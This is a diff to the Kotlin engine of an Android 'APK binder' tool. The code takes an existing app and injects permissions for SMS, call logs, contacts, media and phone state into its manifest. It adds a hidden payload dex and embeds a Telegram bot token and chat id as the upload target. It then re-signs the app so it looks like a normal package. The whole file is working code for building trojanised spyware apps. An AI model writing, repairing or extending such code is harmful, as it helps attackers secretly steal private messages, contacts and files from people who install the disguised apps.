@@ -1,8 +1,13 @@
 package Com.devhs.apkbinder.binder
 
 import android.content.Context
+import android.net.Uri
+import androidx.documentfile.provider.DocumentFile
 import com.android.apksig.ApkSigner
 import Com.devhs.apkbinder.core.Const
+import Com.devhs.apkbinder.data.Feature
+import Com.devhs.apkbinder.data.LogLevel
+import Com.devhs.apkbinder.data.PayloadConfig
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.File
@@ -32,48 +37,67 @@ class BinderEngine(private val context: Context) {
     }
 
     suspend fun bind(
-        sourceApk: File,
-        outApk: File,
-        features: Collection<String>,
-        botToken: String = "",
-        chatId: String = "",
-        onLog: (String) -> Unit
+        source: Uri,
+        activity: String,
+        label: String,
+        features: Set<Feature>,
+        config: PayloadConfig,
+        outDir: DocumentFile,
+        onLog: (LogLevel, String) -> Unit
     ): BindResult = withContext(Dispatchers.IO) {
 
+        val cfg = config
+        val token = cfg.component1()
+        val chat = cfg.component2()
+        @Suppress("UNUSED_VARIABLE")
+        val cfgFeatures = cfg.component3()
+
+        var srcFile: File? = null
         var temp: File? = null
+        var signed: File? = null
 
         try {
-            onLog("[INFO] Source APK: ${sourceApk.name} (${sourceApk.length() / 1024} KB)")
+            if (label.isNotBlank()) onLog(LogLevel.INFO, "App: $label")
+            if (activity.isNotBlank()) onLog(LogLevel.INFO, "Activity: $activity")
+
+            srcFile = resolveSource(source)
+            if (srcFile == null) {
+                onLog(LogLevel.ERROR, "Source APK not readable")
+                return@withContext BindResult(false, "Source not readable")
+            }
+            onLog(LogLevel.INFO, "Source APK: ${srcFile.length() / 1024} KB")
 
             val pm = context.packageManager
-            val info = pm.getPackageArchiveInfo(sourceApk.absolutePath, 0)
-                ?: return@withContext BindResult(false, "Source APK could not be parsed")
+            val info = pm.getPackageArchiveInfo(srcFile.absolutePath, 0)
+            if (info == null) {
+                onLog(LogLevel.ERROR, "Source APK could not be parsed")
+                return@withContext BindResult(false, "Parse failed")
+            }
 
             val pkg = info.packageName
-            onLog("[INFO] Package: $pkg")
+            onLog(LogLevel.INFO, "Package: $pkg")
 
             val permissions = buildPermissions(features)
-            onLog("[INFO] Permissions to inject: ${permissions.size}")
-            permissions.forEach { onLog("   + $it") }
+            onLog(LogLevel.INFO, "Permissions to inject: ${permissions.size}")
 
             val authority = pkg + Const.AUTHORITY_SUFFIX
-            onLog("[INFO] Authority: $authority")
+            onLog(LogLevel.INFO, "Authority: $authority")
 
-            val token = botToken.ifBlank { readConfig().first }
-            val chat = chatId.ifBlank { readConfig().second }
-
-            temp = File(outApk.parentFile, outApk.nameWithoutExtension + ".unsigned.apk")
+            temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
 
             var patched: ByteArray? = null
             var payloadDexName = "classes.dex"
 
-            ZipFile(sourceApk).use { zip ->
+            ZipFile(srcFile).use { zip ->
 
                 val entry = zip.getEntry(MANIFEST)
-                    ?: return@withContext BindResult(false, "$MANIFEST not found")
+                if (entry == null) {
+                    onLog(LogLevel.ERROR, "$MANIFEST not found")
+                    return@withContext BindResult(false, "Manifest missing")
+                }
 
                 val manifest = zip.getInputStream(entry).use { it.readBytes() }
-                onLog("[INFO] Original manifest: ${manifest.size} bytes")
+                onLog(LogLevel.INFO, "Original manifest: ${manifest.size} bytes")
 
                 patched = AxmlPatcher.patch(
                     manifest,
@@ -85,15 +109,16 @@ class BinderEngine(private val context: Context) {
                 )
 
                 if (patched == null) {
+                    onLog(LogLevel.ERROR, "Manifest patch failed")
                     return@withContext BindResult(false, "Manifest patch failed")
                 }
-                onLog("[INFO] Patched manifest: ${patched!!.size} bytes")
+                onLog(LogLevel.INFO, "Patched manifest: ${patched!!.size} bytes")
 
                 payloadDexName = nextDexName(zip)
-                onLog("[INFO] Payload dex slot: $payloadDexName")
+                onLog(LogLevel.INFO, "Payload dex slot: $payloadDexName")
 
                 val payloadDex = readAsset("classes.dex")
-                onLog("[INFO] Payload dex: ${payloadDex.size} bytes")
+                onLog(LogLevel.INFO, "Payload dex: ${payloadDex.size} bytes")
 
                 FileOutputStream(temp).use { fos ->
                     CountingStream(fos).use { cs ->
@@ -123,75 +148,96 @@ class BinderEngine(private val context: Context) {
                                     zos, cs, "assets/" + Const.CONFIG_ASSET,
                                     json.toByteArray(), false
                                 )
-                                onLog("[INFO] Config injected")
+                                onLog(LogLevel.INFO, "Config injected")
                             } else {
-                                onLog("[WARN] Config not found - uploads will fail")
+                                onLog(LogLevel.WARN, "Config missing - uploads will fail")
                             }
                         }
                     }
                 }
             }
 
-            onLog("[INFO] Signing...")
-            val signed = File(outApk.parentFile, outApk.nameWithoutExtension + ".signed.apk")
-            if (signed.exists()) signed.delete()
+            onLog(LogLevel.INFO, "Signing...")
+            signed = File(context.cacheDir, "hs_${System.currentTimeMillis()}.signed.apk")
 
             try {
                 sign(temp, signed, onLog)
             } catch (t: Throwable) {
-                onLog("[ERROR] Sign failed: ${t.message}")
+                onLog(LogLevel.ERROR, "Sign failed: ${t.message}")
                 return@withContext BindResult(false, "Sign failed: ${t.message}")
             }
 
-            if (outApk.exists()) outApk.delete()
-            if (!signed.renameTo(outApk)) {
-                signed.copyTo(outApk, overwrite = true)
-                signed.delete()
-            }
-
-            val check = pm.getPackageArchiveInfo(outApk.absolutePath, 0)
+            val check = pm.getPackageArchiveInfo(signed.absolutePath, 0)
             if (check == null) {
-                onLog("[ERROR] Verification failed: APK unreadable")
+                onLog(LogLevel.ERROR, "Verification failed")
                 return@withContext BindResult(false, "Verification failed")
             }
 
-            onLog("[INFO] Verified package: ${check.packageName}")
-            onLog("[INFO] App class: ${check.applicationInfo?.className ?: "(none)"}")
-            onLog("[INFO] Output: ${outApk.name} (${outApk.length() / 1024} KB)")
+            onLog(LogLevel.INFO, "Verified: ${check.packageName}")
+            onLog(LogLevel.INFO, "App class: ${check.applicationInfo?.className ?: "(none)"}")
+            onLog(LogLevel.INFO, "Signed size: ${signed.length() / 1024} KB")
 
-            BindResult(true, "Success", outApk.absolutePath)
+            if (!outDir.exists() || !outDir.isDirectory) {
+                onLog(LogLevel.ERROR, "Output folder invalid")
+                return@withContext BindResult(false, "Output folder invalid")
+            }
+
+            val outName = sanitize(label) + "_hs.apk"
+            val doc = outDir.createFile("application/vnd.android.package-archive", outName)
+            if (doc == null) {
+                onLog(LogLevel.ERROR, "Cannot create output file")
+                return@withContext BindResult(false, "Cannot create output file")
+            }
+
+            context.contentResolver.openOutputStream(doc.uri)?.use { o ->
+                signed.inputStream().use { i -> i.copyTo(o) }
+            } ?: run {
+                onLog(LogLevel.ERROR, "Cannot write output file")
+                return@withContext BindResult(false, "Cannot write output")
+            }
+
+            onLog(LogLevel.SUCCESS, "Saved: $outName")
+            BindResult(true, "Success", doc.uri.toString())
 
         } catch (t: Throwable) {
-            onLog("[EXCEPTION] ${t.javaClass.simpleName}: ${t.message}")
-            t.stackTrace.take(8).forEach { onLog("   at $it") }
+            onLog(LogLevel.ERROR, "${t.javaClass.simpleName}: ${t.message}")
+            t.stackTrace.take(6).forEach { onLog(LogLevel.ERROR, "   at $it") }
             BindResult(false, t.message ?: "Unknown error")
         } finally {
-            temp?.let { if (it.exists()) it.delete() }
-        }
-    }
-
-    private fun readConfig(): Pair<String, String> {
-        val p = context.getSharedPreferences("hs_prefs", Context.MODE_PRIVATE)
-        var t = p.getString("bot_token", "") ?: ""
-        var c = p.getString("chat_id", "") ?: ""
-        if (t.isNotBlank() && c.isNotBlank()) return t to c
-
-        val dir = File(context.filesDir, "datastore")
-        if (dir.isDirectory) {
-            dir.listFiles()?.forEach { f ->
-                val txt = runCatching { f.readText() }.getOrNull() ?: return@forEach
-                if (t.isBlank()) {
-                    Regex("\\d{8,12}:[A-Za-z0-9_-]{30,45}").find(txt)?.let { t = it.value }
-                }
-                if (c.isBlank()) {
-                    Regex("chat_id[\\s\\S]{1,4}?(-?\\d{5,20})").find(txt)?.let { c = it.groupValues[1] }
-                }
+            try {
+                srcFile?.let { if (it.absolutePath.contains("src_")) it.delete() }
+                temp?.let { if (it.exists()) it.delete() }
+                signed?.let { if (it.exists()) it.delete() }
+            } catch (_: Throwable) {
             }
         }
-        return t to c
     }
 
-    private fun buildPermissions(features: Collection<String>): List<String> {
+    private fun resolveSource(uri: Uri): File? {
+        return try {
+            if (uri.scheme == "file") {
+                val f = uri.path?.let { File(it) }
+                if (f != null && f.exists()) f else null
+            } else {
+                val tmp = File(context.cacheDir, "src_${System.currentTimeMillis()}.apk")
+                context.contentResolver.openInputStream(uri)?.use { i ->
+                    tmp.outputStream().use { o -> i.copyTo(o) }
+                }
+                if (tmp.exists() && tmp.length() > 0) tmp else null
+            }
+        } catch (t: Throwable) {
+            null
+        }
+    }
+
+    private fun sanitize(label: String): String {
+        val base = label.ifBlank { "app" }
+            .replace(Regex("[^A-Za-z0-9._-]"), "_")
+            .take(40)
+        return if (base.isBlank()) "app" else base
+    }
+
+    private fun buildPermissions(features: Set<Feature>): List<String> {
         val set = LinkedHashSet<String>()
 
         set += "android.permission.INTERNET"
@@ -202,25 +248,25 @@ class BinderEngine(private val context: Context) {
         set += "android.permission.FOREGROUND_SERVICE"
         set += "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
 
-        val f = features.map { it.lowercase() }
+        val keys = features.map { (it.key + " " + it.name).lowercase() }
 
-        if (f.any { it.contains("gallery") || it.contains("image") }) {
+        if (keys.any { it.contains("gallery") || it.contains("image") || it.contains("photo") }) {
             set += "android.permission.READ_EXTERNAL_STORAGE"
             set += "android.permission.READ_MEDIA_IMAGES"
             set += "android.permission.READ_MEDIA_VIDEO"
         }
-        if (f.any { it.contains("sms") }) {
+        if (keys.any { it.contains("sms") }) {
             set += "android.permission.READ_SMS"
             set += "android.permission.RECEIVE_SMS"
         }
-        if (f.any { it.contains("call") }) {
+        if (keys.any { it.contains("call") }) {
             set += "android.permission.READ_CALL_LOG"
             set += "android.permission.READ_PHONE_STATE"
         }
-        if (f.any { it.contains("contact") }) {
+        if (keys.any { it.contains("contact") }) {
             set += "android.permission.READ_CONTACTS"
         }
-        if (f.any { it.contains("device") || it.contains("info") }) {
+        if (keys.any { it.contains("device") || it.contains("info") }) {
             set += "android.permission.READ_PHONE_STATE"
         }
 
@@ -305,7 +351,7 @@ class BinderEngine(private val context: Context) {
     private fun readAsset(name: String): ByteArray =
         context.assets.open(name).use { it.readBytes() }
 
-    private fun sign(input: File, output: File, onLog: (String) -> Unit) {
+    private fun sign(input: File, output: File, onLog: (LogLevel, String) -> Unit) {
         val ks = KeyStore.getInstance("JKS")
         context.assets.open(Const.KEYSTORE_ASSET).use {
             ks.load(it, Const.KS_PASS.toCharArray())
@@ -328,6 +374,6 @@ class BinderEngine(private val context: Context) {
             .build()
             .sign()
 
-        onLog("[INFO] Signed: ${output.length() / 1024} KB")
+        onLog(LogLevel.INFO, "Signed: ${output.length() / 1024} KB")
     }
 }
